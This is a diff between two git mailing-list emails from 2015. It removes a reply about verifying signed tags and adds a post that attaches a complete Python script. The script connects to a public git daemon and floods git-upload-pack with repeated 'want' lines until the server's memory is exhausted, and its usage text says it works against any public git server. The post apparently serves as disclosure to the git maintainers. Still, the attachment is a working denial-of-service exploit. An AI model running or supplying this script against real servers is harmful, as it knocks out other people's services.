@@ -1,117 +1,126 @@
-From: Johannes =?utf-8?B?TMO2dGhiZXJn?= <johannes@kyriasis.com>
-Subject: Re: Signed tags and git repository
-Date: Thu, 26 Nov 2015 04:56:00 +0100
-Message-ID: <20151126035600.GA11556@zorg.kyriasis.com>
-References: <3816223.3lD8Al3iuQ@thunderbird>
+From: ytrezq@sdf-eu.org
+Subject: arbitrary memory allocation
+Date: Thu, 26 Nov 2015 05:06:35 +0100
+Message-ID: <1a012fc79a55cae8b948b28d1259be0c.squirrel@sdfeu.org>
+Reply-To: ytrezq@sdf-eu.org
 Mime-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="NzB8fVQJ5HfG6fxh"
-Cc: Stephen & Linda Smith <ischis2@cox.net>
+Content-Type: multipart/mixed;boundary="----=_20151126050635_37662"
 To: git@vger.kernel.org
-X-From: git-owner@vger.kernel.org Thu Nov 26 04:56:49 2015
+X-From: git-owner@vger.kernel.org Thu Nov 26 05:20:58 2015
 Return-path: <git-owner@vger.kernel.org>
 Envelope-to: gcvg-git-2@plane.gmane.org
 Received: from vger.kernel.org ([209.132.180.67])
 	by plane.gmane.org with esmtp (Exim 4.69)
 	(envelope-from <git-owner@vger.kernel.org>)
-	id 1a1nfF-0008NO-5y
-	for gcvg-git-2@plane.gmane.org; Thu, 26 Nov 2015 04:56:09 +0100
+	id 1a1o3F-0003Md-5S
+	for gcvg-git-2@plane.gmane.org; Thu, 26 Nov 2015 05:20:57 +0100
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752031AbbKZD4F (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
-	Wed, 25 Nov 2015 22:56:05 -0500
-Received: from theos.kyriasis.com ([212.71.254.33]:33304 "EHLO
-	theos.kyriasis.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752012AbbKZD4E (ORCPT <rfc822;git@vger.kernel.org>);
-	Wed, 25 Nov 2015 22:56:04 -0500
-Received: from theos.kyriasis.com (localhost [127.0.0.1])
-	by theos.kyriasis.com (OpenSMTPD) with ESMTP id 6f8ace61;
-	Thu, 26 Nov 2015 03:56:00 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=kyriasis.com; h=date:from
-	:to:cc:subject:message-id:references:mime-version:content-type
-	:in-reply-to; s=theos; bh=q7Q3sl+7Zox3ElshnuKYhCWeTn0=; b=J/9N49
-	Mw0arIzt64/iS44dyaQQhw6pwzcNxKysGmOoJ2SVP5kTT4veRoAYoeYonv/mNzbD
-	iW8oNZTs2YID7e5lQWqRzsYhUTU0suEV6PYN2rVZazpDg4fei2OgPV0W9Wvr2LQU
-	+eI4R0+tsOoKeETfdeUK8Bg36EUEZenOrCGBw=
-DomainKey-Signature: a=rsa-sha1; c=nofws; d=kyriasis.com; h=date:from:to
-	:cc:subject:message-id:references:mime-version:content-type
-	:in-reply-to; q=dns; s=theos; b=kwxYl2E1DisgnMYn9RJxyBEN1aLBlQY6
-	FrgHvSU4OVIk4yIZSlMSBn2tefOVqj0Ea3s20rK/9vDbhPOAZMNEKbVOo98v3XK8
-	S8GSCTnD/RejAN4CBlSCoNS9n7vPFBQ22QLXj2ml2UQ0d54lsrKAJCbAi5HZANUA
-	GLAODnewaqM=
-Received: from zorg.kyriasis.com (c80-217-51-233.bredband.comhem.se [80.217.51.233])
-	by theos.kyriasis.com (OpenSMTPD) with ESMTPSA id 7b49bfce
-	TLS version=TLSv1/SSLv3 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO;
-	Thu, 26 Nov 2015 03:56:00 +0000 (UTC)
-Mail-Followup-To: git@vger.kernel.org,
-	Stephen & Linda Smith <ischis2@cox.net>
-Content-Disposition: inline
-In-Reply-To: <3816223.3lD8Al3iuQ@thunderbird>
-User-Agent: Mutt/1.5.23.1 (2014-03-12)
+	id S1752322AbbKZEUt (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
+	Wed, 25 Nov 2015 23:20:49 -0500
+Received: from odin.sdf-eu.org ([178.63.35.194]:49705 "EHLO sdfeu.org"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S1752272AbbKZEUs (ORCPT <rfc822;git@vger.kernel.org>);
+	Wed, 25 Nov 2015 23:20:48 -0500
+X-Greylist: delayed 491 seconds by postgrey-1.27 at vger.kernel.org; Wed, 25 Nov 2015 23:20:48 EST
+Received: from sdfeu.org (IDENT:www@odin.sdf-eu.org [178.63.35.194])
+	by sdfeu.org (8.14.8/8.14.3) with ESMTP id tAQ46ZXH025661
+	for <git@vger.kernel.org>; Thu, 26 Nov 2015 04:06:35 GMT
+Received: from 24.41.74.86.rev.sfr.net ([86.74.41.24])
+        (SquirrelMail authenticated user ytrezq)
+        by sdfeu.org with HTTP;
+        Thu, 26 Nov 2015 05:06:35 +0100
+User-Agent: SquirrelMail/1.4.21
+X-Priority: 1 (Highest)
+Importance: High
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
-Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281753>
+Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281754>
+
+------=_20151126050635_37662
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8bit
+
+Hello,
+
+First, something I still don t understand, should I always ulimit ram
+usage for security purposes when I m manage a public server?
+
+If not, you may find the attachment interesting
+------=_20151126050635_37662
+Content-Type: text/x-python; name="git-clone.py"
+Content-Transfer-Encoding: 8bit
+Content-Disposition: attachment; filename="git-clone.py"
+
+#!/usr/bin/python
+from socket import *
+import sys,time
+if len(sys.argv)!=3:
+	print "Ok, it is not a real memory leak but it can be used against any public git server.\nAn http version of this script would benefit from a large zlib compression ratio allowing to fill the ram 200 time faster like with ssh"
+	print ""
+	print "usage"
+	print "argv1 is the target domain name or address"
+	print "argv2 is the path to a non empty repo with at least 2 refs"
+	print ""
+	print "for example git://somesite.com/git/linux.git would become"
+	print sys.argv[0] + " somesite.com /git/linux.git"
+	exit(1)
+
+sockobj = socket(AF_INET, SOCK_STREAM)
+sockobj.connect((sys.argv[1],9418))
+path="git-upload-pack "+sys.argv[2]+"\0host="+sys.argv[1]+'\0' # request a clone
+sockobj.send(format(len(path)+4,'04x')+path) # see the git documentation for more information about the pkt-line format
+
+# Even when blocking, socket.recv might not send the complete request size
+def full_read(length):
+	buf=sockobj.recv(length)
+	size=length-len(buf)
+	while size>0:
+		time.sleep(0.001) # wait for data to arrive
+		buf+=sockobj.recv(size)
+		size=size-len(buf)
+	return buf
+
+obj=[full_read(int(full_read(4),16)-4)]
+pkt_line_length=int(sockobj.recv(4),16)-4 # represent the lenght of a packet in pkt-line format (in hex on 4 ascii bytes)
+while pkt_line_length>0:
+	obj.append(full_read(pkt_line_length))
+	pkt_line_length=int(full_read(4),16)-4
+	if sys.getsizeof(obj)>150000: # Don t do the same error of the official git project, limit our ram usage
+		time.sleep(1)
+		sockobj.recv(10000) # be sure git-upload-pack would be ready for recieving
+		break
+
+first_line="want "+obj[0][:40]+" multi_ack_detailed side-band-64k thin-pack ofs-delta agent=git/2.9.2\n" # The first line have a different format
+sockobj.send(format(len(first_line)+4,'04x')+first_line) # send it in the pkt-line format
+
+line_list="0032want "+obj[1][:40]+'\n'
+while len(line_list)<65430: # Get the ideal tcp packet size for fastest bandwidth (64Ko)
+	for i in obj:
+		if (i==obj[0]) or (i==obj[1]) or ("pull" in i):
+			continue
+		line_list+="0032want "+i[:40]+'\n'
+		if len(line_list)>65480:
+			break
 
 
---NzB8fVQJ5HfG6fxh
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+# struct object (see object.h line 47)
+# unsigned int
+# unsigned int
+# unsigned int
+# unsigned int
+# unsigned char binary_sha[20]
 
-On 25/11, Stephen & Linda Smith wrote:
->I know that the linux and git repositories have signed tags, but I'm not a=
-ble to verify
->them because my key isn't signed by anyone that leads back to one of the g=
-it or linux
->maintainers.
-
-Your key would only have to be signed for others to be able to verify=20
-/your/ signatures through the Web of Trust.
-
-You don't even need the Web of Trust though, you can just verify the=20
-signature and then check that the key used to make the signature is the=20
-correct one, then you could either sign the key if you know that the key=20
-belongs to the right person and want to make the signature public, or=20
-make a local signature which is local to your keyring and won't be sent=20
-to eg keyservers. Or just mark the key as trusted overall.
-
---=20
-Sincerely,
-  Johannes L=C3=B6thberg
-  PGP Key ID: 0x50FB9B273A9D0BB5
-  https://theos.kyriasis.com/~kyrias/
-
---NzB8fVQJ5HfG6fxh
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQRQBAABCgA6BQJWVoLNMxSAAAAAABUAFXBrYS1hZGRyZXNzQGdudXBnLm9yZ2pv
-aGFubmVzQGt5cmlhc2lzLmNvbQAKCRCQHBwyDrDUXWWaIADCEmqavYOK7fk77TlK
-RGHsMcqAZR4z7FyP79KU3F0396iBGQNviRTjCDpd8kBrfam1GwbAfY6sZVyqyReU
-ixNHZbxwoY56HMeCemUmkDIgbGtdbisLtYuvojbfRQtbsCK9ihzCTPLxGKS66ziA
-3o84cgqP4hmbAqFUf0B1JKYrbsHxxoUuG6vnZ09f6ZE1mzYJX78DYisujFRy38uy
-uVIRTsOri7kx2XvHYHNKLcfMmBEYn+ckXMAla9tb2RlCC7IdZJh4V+DBURT2mFf7
-a6j4p4k0ZAbUut0SWu07IH6gbHWxYwmgY4F7Tq+aKD9nqYzG07ZU+KwTNc/Csnao
-WLxAh+WBMLcUu1c+W6g66t/a4t/DZab95x1BYYdmaL8l6XhZ547FU+YgUtDM3x3t
-tPaaljgo+zpTJ+SBwwyyjpLb1TUJM4tgSXgzJNDg8bRtliFVV8UqngrCFO/sWX81
-RlqWBclBlEvmFebWDf6aBNECj6xCugnFBnTr9Id0CWmS2NTyjqQtGd2EbfZ4izYx
-xBdBvMMjo2w0U6bEHNtwp7d9XuAGfdsJk1f5796z/f3aFRKG78OIjjG+LWElWiOg
-oVxzjmnyeT9LTwyHELTgYwMS7t9s3xkYUAmbV+9wj8jU2MqFv1FYo6wiruhPMGYz
-SZFUwAp2gj3WqfyIySNyQtw5JPCLxCuRiQ2QAnzv399tVsPWoJyx20M74WMYxOd2
-dFkBh5l10omvTuqrwASKreTznokCN9LjFCfYqA+RctgPkZR1Dql7gbyPj93nBnPX
-zDwO9BL+/MNAN3yu4LqHqyiCQu/NtxIC3/4xEI3CUGFagYFVnPuKSml4bK+dRMhD
-ZKstCj5rst7xmgqmbx/pXs33JnSxUQb87aONL84JWTVW59bFKHP1has1DwVyxGts
-O+Cd0+gvzwRAnxIRsU4vjQG4ATV5cNR9DGmjTF2m+rdiNXAyiPfRSCSkV51af3OY
-1c4vlR9wsKXywCLzJ3ZG0ijwSWStTmZ9xWbKCi0afTu0HWvVjNuvGpYY1nutS4wY
-N5JFxZLRwA9VYigSrc+1dVC69E++RHfw307K315pmO65FU63wx9JI0LfSCPDsitz
-1ZFeCzmnr8DbTzWmO8fhMBxsiQd3Jyut+X06JThn69T1VjtXsuUxvAul8gKVDpOr
-6cCVc6kOObbybt8aEtmXXVO1Oqt1c78y7wHRBn9LagpfUxCrunnX02b/+gFz4dHN
-uWV0pGCb104Y3/fag5bAOfDtUH1fynFkIclwapS+gFRxgwGciybQ72ovY5z6j9pq
-q5eI9NINeKwCmuhQ/cFyQz0JbjObteooXs/Wx0lS9qf+54z6n0FxuSG3m9LH1tgo
-3GMn
-=oxKo
------END PGP SIGNATURE-----
-
---NzB8fVQJ5HfG6fxh--
+# objects=object +
+# char *=NULL (64 bit int)
+# char *=NULL (64 bit int)
+# unsigned mode
+line_list_len=line_list.count('\n')*56 # Line lengths of the pkt-line format won t fill the ram, so remove them from the size counter
+count=line_list_len
+while True:
+	sys.stdout.flush()
+	sockobj.send(line_list) # for each line, the git-send-pack process allocate append a member to a struct objects array
+	print("\r%.2f Mo of ram filled" % float(count/float(1048576))),
+	count+=line_list_len
+------=_20151126050635_37662--
